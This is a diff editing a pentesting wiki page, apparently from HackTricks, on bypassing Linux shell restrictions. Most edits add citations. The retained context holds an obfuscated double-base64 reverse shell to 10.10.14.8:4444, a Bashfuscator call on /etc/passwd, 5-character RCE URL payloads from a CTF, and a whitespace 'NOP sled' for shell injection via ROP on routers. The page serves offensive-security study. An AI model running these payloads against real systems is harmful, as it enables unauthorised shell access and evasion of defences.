@@ -4,10 +4,12 @@
 
 ## Common Limitations Bypasses
 
+The command-injection and WAF-evasion collections in PayloadsAllTheThings, Bo0oM's cheat sheet, and the two linked Secjuice articles provide background for the shell-syntax variations in this section.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+
 ### Reverse Shell
 
 ```bash
-# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
+# Double-Base64 payload
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
@@ -160,12 +162,12 @@ echo ${PATH:0:1} #/
 
 ### DNS data exfiltration
 
-You could use **burpcollab** or [**pingb**](http://pingb.in) for example.
+For out-of-band callbacks, a collaborator-style service such as Burp Collaborator can induce a target application to interact with an external server; the existing [**pingb**](http://pingb.in) link is retained as historical navigation, not a current availability claim.<sup>[[6]](#references)</sup>
 
 ### Builtins
 
-In case you cannot execute external functions and only have access to a **limited set of builtins to obtain RCE**, there are some handy tricks to do it. Usually you **won't be able to use all** of the **builtins**, so you should **know all your options** to try to bypass the jail. Idea from [**devploit**](https://twitter.com/devploit).\
-First of all check all the [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Then here you have some **recommendations**:
+In a restricted shell, the available builtins are the remaining command surface for these examples; Bash documents its builtin commands and execution grammar.<sup>[[7]](#references)</sup> Idea from [**devploit**](https://twitter.com/devploit).\
+Start with the existing [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) navigation, then try the following Bash-specific techniques:<sup>[[7]](#references)</sup>
 
 ```bash
 # Get list of builtins
@@ -235,6 +237,8 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 
 ### Bashfuscator
 
+The following invocation uses Bashfuscator, an open-source Bash obfuscation framework; the repository link in the code comment is retained as navigation.<sup>[[8]](#references)</sup>
+
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
@@ -242,9 +246,11 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 
 ### RCE with 5 chars
 
+The following two historical 5-character examples are retained as challenge reproductions: the primary challenge repository is available at [Orange Tsai’s repository](https://github.com/orangetw/My-CTF-Web-Challenges), while the second write-up link in the code block is navigation whose current availability was not verified.<sup>[[9]](#references)</sup>
+
 ```bash
-# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
-#Oragnge Tsai solution
+# From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
+#Orange Tsai solution
 ## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
 http://host/?cmd=>ls\
 http://host/?cmd=ls>_
@@ -328,8 +334,7 @@ ln /f*
 
 ## Read-Only/Noexec/Distroless Bypass
 
-If you are inside a filesystem with the **read-only and noexec protections** or even in a distroless container, there are still ways to **execute arbitrary binaries, even a shell!:**
-
+If you are inside a filesystem with **read-only and noexec protections**, or in a **distroless image**, the environment imposes execution constraints documented by Linux `mount(8)` and the Distroless project; the linked page collects techniques for working within them.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -337,16 +342,15 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Chroot & other Jails Bypass
 
-
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-When a vulnerability lets you partially control an argument that ultimately reaches `system()` or another shell, you may not know the exact offset at which execution starts reading your payload.  Traditional NOP sleds (e.g. `\x90`) do **not** work in shell syntax, but Bash will harmlessly ignore leading whitespace before executing a command.
+When a vulnerability lets you partially control an argument that ultimately reaches `system()` or another shell, the payload offset may be uncertain. Alan Cao and Will Tan describe a constrained embedded-device case where a shell payload was sprayed into memory-mapped NVRAM and prefixed with spaces.<sup>[[5]](#references)</sup>
 
-Therefore you can create a *NOP sled for Bash* by prefixing your real command with a long sequence of spaces or tab characters:<sup>[[5]](#references)</sup>
+Therefore you can create a *NOP sled for Bash* by prefixing your real command with a long sequence of spaces or tab characters; Bash defines spaces and tabs as blanks that separate words in a simple command.<sup>[[5]](#references)[[7]](#references)</sup>
 
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
@@ -354,15 +358,15 @@ Therefore you can create a *NOP sled for Bash* by prefixing your real command wi
 # 16× spaces ───┘ ↑ real command
 ```
 
-If a ROP chain (or any memory-corruption primitive) lands the instruction pointer anywhere within the space block, the Bash parser simply skips the whitespace until it reaches `nc`, executing your command reliably.
+If a ROP chain (or another memory-corruption primitive) passes a command-string pointer that begins anywhere within the space block, Bash can parse the remaining leading blanks until it reaches the command; in the d router exploit, this made uncertain string offsets usable.<sup>[[5]](#references)[[7]](#references)</sup>
 
-Practical use cases:
+Practical use cases in constrained embedded targets include:<sup>[[5]](#references)</sup>
 
-1. **Memory-mapped configuration blobs** (e.g. NVRAM) that are accessible across processes.
-2. Situations where the attacker can not write NULL bytes to align the payload.
-3. Embedded devices where only BusyBox `ash`/`sh` is available – they also ignore leading spaces.
+1. **Memory-mapped configuration blobs** (e.g. NVRAM) that are accessible across processes.<sup>[[5]](#references)</sup>
+2. Payload channels where the attacker cannot write NULL bytes to align the payload (a general adaptation of the alignment problem).<sup>[[5]](#references)</sup>
+3. Embedded devices with a small BusyBox `ash`/`sh` environment, which BusyBox documents as applets in resource-constrained systems.<sup>[[10]](#references)</sup>
 
-> 🛠️  Combine this trick with ROP gadgets that call `system()` to dramatically increase exploit reliability on memory-constrained IoT routers.
+> 🛠️  Combine this technique with ROP gadgets that call `system()` in a controlled lab; the d router research demonstrates this combination on constrained hardware.<sup>[[5]](#references)</sup>
 
 ## References
 
@@ -370,6 +374,13 @@ Practical use cases:
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 - [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [5] [Alan Cao and Will Tan — Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
+- [7] [bash(1) — Linux manual page](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+- [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
+- [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
+- [11] [mount(8) — Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
 
 {{#include ../../../banners/hacktricks-training.md}}
